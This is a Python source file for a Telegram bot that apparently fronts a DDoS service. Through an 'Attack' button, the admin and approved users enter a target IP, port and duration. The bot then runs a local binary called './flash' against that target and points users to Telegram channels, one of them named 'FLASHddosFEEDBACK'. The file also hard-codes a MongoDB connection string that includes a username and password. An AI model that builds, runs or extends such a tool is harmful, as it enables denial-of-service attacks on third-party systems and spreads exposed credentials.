import subprocess  # subprocess को इम्पोर्ट किया गया
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from pymongo import MongoClient  # 
from flashh import TOKEN # Add your token here
from flashh import ADMIN_ID

# MongoDB Connection
MONGO_URL = "mongodb+srv://patelji:pateljii@cluster0.f2bdi.mongodb.net/patelji?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URL)
db = client.patelji  
approved_users_collection = db.approved_users  

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Path to your binary
BINARY_PATH = "./flash"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = None

# Check if the user is admin
def is_admin(update: Update) -> bool:
    if update.effective_user is None:
        return False  # If effective_user is None, user is not admin
    return update.effective_user.id == ADMIN_ID

# Check if the user is approved (check from MongoDB)
def is_approved_user(update: Update) -> bool:
    if update.effective_user is None:
        return False  # If effective_user is None, user is not approved
    user_id = update.effective_user.id
    return approved_users_collection.find_one({"user_id": user_id}) is not None

# Approve a user (admin only, store in MongoDB)
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id = int(context.args[0])
        if approved_users_collection.find_one({"user_id": user_id}) is None:
            approved_users_collection.insert_one({"user_id": user_id})
            await update.message.reply_text(f"User {user_id} has been approved and added to the database.")
        else:
            await update.message.reply_text(f"User {user_id} is already approved.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID.")

# Disapprove a user (admin only, remove from MongoDB)
async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("This action is for admin use only.")
        return

    try:
        user_id = int(context.args[0])
        result = approved_users_collection.delete_one({"user_id": user_id})
        if result.deleted_count > 0:
            await update.message.reply_text(f"User {user_id} has been disapproved and removed from the database.")
        else:
            await update.message.reply_text(f"User {user_id} is not in the approved list.")
    except (IndexError, ValueError):
        await update.message.reply_text("Please provide a valid user ID.")

# Start command: Show Attack button (admin and approved users only)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.message.reply_text("This bot is for Admin use only.")
        return

    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("By https://t.me/flashmainchannel 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)", reply_markup=reply_markup)

# Handle button clicks (admin and approved users only)
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_admin(update) and not is_approved_user(update):
        await query.message.reply_text("This bot is for Admin use only.")
        await query.answer()
        return

    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text("By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀")

# Handle target, port, and time input (admin and approved users only)
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.message.reply_text("This bot is for Admin use only.")
        return

    global target_ip, target_port, attack_time

    try:
        # User input is expected in the format: <target> <port> <time>
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
           # [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
                                        "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text('''Invalid format. Please enter in the format: 
<target> <port> <time>🚀🚀''')

# Start the attack (admin and approved users only)
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.callback_query.message.reply_text("This bot is for Admin use only.")
        return

    global process, target_ip, target_port, attack_time
    if not target_ip or not target_port or not attack_time:
        await update.callback_query.message.reply_text("Please configure the target, port, and time first.")
        return

    if process and process.poll() is None:
        await update.callback_query.message.reply_text("Attack is already running.")
        return

    try:
        # Run the binary with target, port, and time
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.callback_query.message.reply_text(f"CHIN TAPAK DUM DUM(●'◡'●) FeedBack De Dio Yaad se 😡 :- 👉 https://t.me/FLASH_502 {target_ip}:{target_port} for {attack_time} seconds https://t.me/addlist/aGuzDCoYQChkN2Q1")
    except Exception as e:
        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
        logging.error(f"Error starting attack: {e}")

# Stop the attack (admin and approved users only)
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.callback_query.message.reply_text("This bot is for Admin use only.")
        return

    global process
    if not process or process.poll() is not None:
        await update.callback_query.message.reply_text("CHIN TAPAK DUM DUM NHI CHAL RHA (●'◡'●) t.me/FLASHddosFEEDBACK ")
        return

    process.terminate()
    process.wait()
    await update.callback_query.message.reply_text("Attack stopped.")

# Reset the attack (admin and approved users only)
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.callback_query.message.reply_text("This bot is for Admin use only.")
        return

    global process, target_ip, target_port, attack_time
    if process and process.poll() is None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    attack_time = None
    await update.callback_query.message.reply_text("Attack reset. By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀")

# Button action handler for start/stop/reset actions (admin and approved users only)
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) and not is_approved_user(update):
        await update.callback_query.message.reply_text("This bot is for Admin use only.")
        return

    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)

# Main function to start the bot
def main():
    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register approval and disapproval commands
    # application.add_handler(CommandHandler("approve", approve))
    # application.add_handler(CommandHandler("disapprove", disapprove))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))

    # Register message handler to handle input for target, port, and time
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
